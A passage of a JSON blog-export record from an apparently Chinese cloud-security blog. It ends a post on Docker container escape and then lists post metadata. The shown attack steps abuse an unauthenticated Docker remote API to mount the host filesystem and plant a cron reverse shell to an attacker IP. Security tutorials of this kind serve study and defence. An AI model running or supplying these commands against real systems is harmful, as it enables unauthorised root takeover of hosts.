class=\"line\"><span style=\"color: #62E884\">docker</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-H</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">tcp://10.1.1.211:2375</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">run</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-it</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #BF9EEE\">-v</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/:/mnt</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">nginx:latest</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/bin/bash</span></span></code></pre></div><p>在容器内执行命令，将反弹 shell 的脚本写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #97E1F1\">echo</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #DEE492\">&#39;</span><span style=\"color: #E7EE98\">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.1.1.214/12345 0&gt;&amp;1</span><span style=\"color: #DEE492\">&#39;</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">&gt;&gt;</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #E7EE98\">/mnt/var/spool/cron/crontabs/root</span></span></code></pre></div><p>本地监听端口，获取对方宿主机 shell。</p>\n","feature":true,"text":"云原生-docker拿到权限：判断是否为容器 https://blog.csdn.net/qq_23936389/article/details/1314866...","permalink":"/post/云攻防-云原生-docker","photos":[],"count_time":{"symbolsCount":"4.1k","symbolsTime":"4 mins."},"categories":[{"name":"云安全","slug":"云安全","count":3,"path":"api/categories/云安全.json"}],"tags":[{"name":"云安全","slug":"云安全","count":3,"path":"api/tags/云安全.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BA%91%E5%8E%9F%E7%94%9F-docker\"><span class=\"toc-text\">云原生-docker</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8-%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F\"><span class=\"toc-text\">容器逃逸 - 特权模式</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8-%E6%8C%82%E8%BD%BD-%E9%80%83%E9%80%B8\"><span class=\"toc-text\">容器逃逸 - 挂载 逃逸</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%8C%82%E8%BD%BD-Docker-Socket-%E9%80%83%E9%80%B8-%EF%BC%9A\"><span class=\"toc-text\">挂载 Docker Socket 逃逸 ：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%8C%82%E8%BD%BD-procfs-%E9%80%83%E9%80%B8-%EF%BC%9A\"><span class=\"toc-text\">挂载 procfs 逃逸 ：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Docker-%E8%BF%9C%E7%A8%8B-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E9%80%83%E9%80%B8\"><span class=\"toc-text\">Docker 远程 API 未授权访问逃逸</span></a></li></ol></li></ol>","author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"云攻防-K8S安全","uid":"aa2cc9f18c0295fd4c228dc62555a6a1","slug":"云攻防-K8S安全","date":"2025-05-17T08:38:05.197Z","updated":"2025-05-17T09:17:36.613Z","comments":true,"path":"api/articles/云攻防-K8S安全.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/6f0ed8a7-9402-4c93-84ed-727d54681967.jpg","text":"云攻防-K8S安全Kubernetes 是一个开源的，用于编排云平台中多个主机上的容器化的应用，目标是让部署容器化的应用能简单并且高效的使用，提供了应用部署，规...","permalink":"/post/云攻防-K8S安全","photos":[],"count_time":{"symbolsCount":"8.6k","symbolsTime":"8 mins."},"categories":[{"name":"云安全","slug":"云安全","count":3,"path":"api/categories/云安全.json"}],"tags":[{"name":"云安全","slug":"云安全","count":3,"path":"api/tags/云安全.json"}],"author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"Java安全学习路径","uid":"7c3e14f0681c54989a322aaf4933843e","slug":"Java安全学习路线","date":"2025-05-17T07:27:11.184Z","updated":"2025-05-17T09:15:50.655Z","comments":true,"path":"api/articles/Java安全学习路线.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%23chudia%20%23anime%20%23wataa%20%23girl%20%23wlw.jpg","text":"参考文章： https://github.com/HackJava/HackJava ","permalink":"/post/Java安全学习路线","photos":[],"count_time":{"symbolsCount":43,"symbolsTime":"1 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":4,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java安全","slug":"Java安全","count":4,"path":"api/tags/Java安全.json"}],"author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}},"feature":true}}